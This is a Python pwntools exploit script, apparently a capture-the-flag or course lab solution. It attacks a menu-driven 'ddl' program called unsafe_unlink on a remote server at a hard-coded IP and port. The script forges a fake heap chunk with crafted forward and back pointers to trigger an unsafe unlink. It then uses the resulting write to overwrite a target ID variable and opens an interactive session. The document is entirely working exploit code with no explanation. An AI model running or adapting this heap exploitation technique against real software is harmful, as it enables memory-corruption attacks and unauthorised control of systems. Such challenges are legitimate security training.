from pwn import *
import struct
context.log_level = 'DEBUG'
e = ELF('./unsafe_unlink')
conn = remote("47.99.80.189", 10031)
# conn = process('./unsafe_unlink')
array = 0x00000000006020e0
targetID = 0x00000000006020c0
p_chunk0 =array


def create_ddl():
    conn.recvuntil("chocie:\n")
    conn.sendline("1")
    conn.recvuntil("the ddl time\n")
    conn.sendline("aaaa")
    conn.recvuntil("the ddl content\n")
    conn.sendline("content")


def finish_ddl(x):
    conn.recvuntil("chocie:\n")
    conn.sendline("2")
    conn.recvuntil("the ddl index\n")
    conn.sendline(str(x))

def edit_ddl(x,y,z):
    conn.recvuntil("chocie:\n")
    conn.sendline("4")
    conn.recvuntil("the ddl index")
    conn.sendline(str(x))
    conn.recvuntil("the new ddl time\n")
    conn.send(y)
    conn.recvuntil("new ddl content\n")
    conn.send(z)

def show_ddl(x):
    conn.recvuntil("chocie:\n")
    conn.sendline("3")
    conn.recvuntil("the ddl index\n")
    conn.sendline(x)

conn.recvuntil("ID:\n")
conn.sendline("3180104933")
create_ddl()
create_ddl()
create_ddl()

pay_time = p64(0)+p64(0x601-0x10)+p64(p_chunk0-0x18)+p64(p_chunk0-0x10)
pay_content = b'\x00'*(0x5d0)+p64(0x600-0x10) # 注意，不可以填'A'
edit_ddl(1,pay_time,pay_content)
# gdb.attach(conn,"break finish_ddl")
# # conn.recvuntil("chocie:")
finish_ddl(2)
pay2_time = b'\x00'*0x18 + p64(p_chunk0-0x18)
pay2_content = p64(targetID)
edit_ddl(1,pay2_time,pay2_content+b'\n')
# gdb.attach(conn,"break finish_ddl")
edit_ddl(2,p64(3180104933)+b'\n','test\n')


conn.recvuntil("chocie:")
conn.sendline("6")
conn.interactive()
